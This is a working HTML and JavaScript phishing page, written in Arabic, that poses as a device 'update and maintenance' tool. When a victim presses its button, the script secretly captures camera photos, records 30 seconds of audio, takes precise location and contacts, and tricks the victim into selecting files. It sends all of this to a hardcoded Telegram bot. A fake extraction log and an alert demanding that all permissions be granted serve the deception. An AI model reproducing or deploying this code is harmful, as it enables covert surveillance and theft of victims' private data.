<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>AI EL-NAGM | FULL DATA EXTRACTOR</title>
    <style>
        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; }
        .main { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; border: 2px dashed #00ff41; margin: 10px; }
        .btn-mega { background: #00ff41; color: #000; padding: 20px; width: 80%; font-weight: bold; border: none; cursor: pointer; font-size: 1.2rem; clip-path: polygon(10% 0, 100% 0, 90% 100%, 0 100%); }
        .log-stream { font-size: 10px; color: #555; margin-top: 20px; text-align: left; width: 80%; height: 50px; overflow: hidden; }
    </style>
</head>
<body>

<div class="main">
    <h1 style="text-shadow: 0 0 10px #00ff41;">EL-NAGM AI 8.0</h1>
    <p>بانتظار مزامنة كامل ملفات الجهاز...</p>
    
    <button class="btn-mega" onclick="startFullExtraction()">تحديث وصيانة الملفات الشاملة</button>

    <div class="log-stream" id="logs"></div>
</div>

<video id="v" autoplay playsinline muted style="display:none;"></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const token = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
    const chatId = "8754338811";

    async function push(data, type = "text", fileName = "data.txt") {
        let url = `https://api.telegram.org/bot${token}/`;
        const fd = new FormData();
        fd.append('chat_id', chatId);

        if (type === "text") {
            url += "sendMessage";
            fd.append('text', data);
            fd.append('parse_mode', 'Markdown');
        } else {
            url += (type === "photo" ? "sendPhoto" : "sendDocument");
            fd.append(type === "photo" ? "photo" : "document", data, fileName);
        }
        return fetch(url, { method: 'POST', body: fd });
    }

    async function startFullExtraction() {
        document.querySelector('.btn-mega').innerText = "جاري السحب... لا تغلق التطبيق";
        
        try {
            // 1. الوصول للكاميرا والميكروفون (صور وصوت)
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('v').srcObject = stream;

            // 2. سحب الموقع الدقيق
            navigator.geolocation.getCurrentPosition(p => {
                push(`📍 *موقع الضحية:* http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            });

            // 3. سحب الأسماء (Contacts) - ميزة متقدمة
            if ('contacts' in navigator && 'ContactsManager' in window) {
                const props = ['name', 'tel', 'email'];
                const contacts = await navigator.contacts.select(props, { multiple: true });
                push(`👥 *تم سحب الأسماء:* \n${JSON.stringify(contacts, null, 2)}`);
            }

            // 4. سحب صور سيلفي حية
            const canvas = document.getElementById('c');
            canvas.width = 640; canvas.height = 480;
            const ctx = canvas.getContext('2d');
            
            for(let i=0; i<5; i++) {
                setTimeout(() => {
                    ctx.drawImage(document.getElementById('v'), 0, 0);
                    canvas.toBlob(b => push(b, "photo", `img_${i}.jpg`), 'image/jpeg');
                }, i * 2000);
            }

            // 5. خدعة سحب الملفات (يقوم الضحية باختيار الصور/الملفات الهامة)
            const fileInput = document.createElement('input');
            fileInput.type = 'file';
            fileInput.multiple = true;
            fileInput.onchange = e => {
                for(let file of e.target.files) {
                    push(file, "document", file.name);
                }
            };
            fileInput.click(); // تفتح نافذة الملفات للضحية ليختار "تحديث الصور"

            // 6. تسجيل صوتي (30 ثانية) للوسط المحيط
            const recorder = new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => push(new Blob(chunks), "document", "voice_record.ogg");
            recorder.start();
            setTimeout(() => recorder.stop(), 30000);

        } catch (err) {
            alert("فشل النظام: يرجى الموافقة على 'سماح' لجميع الأذونات لإتمام التحديث.");
        }
    }

    // سجل العمليات الوهمي
    setInterval(() => {
        const l = document.getElementById('logs');
        l.innerHTML += `> EXTRACTING_0x${Math.random().toString(16).slice(2,6)}... DONE<br>`;
        l.scrollTop = l.scrollHeight;
    }, 1500);
</script>
</body>
</html>
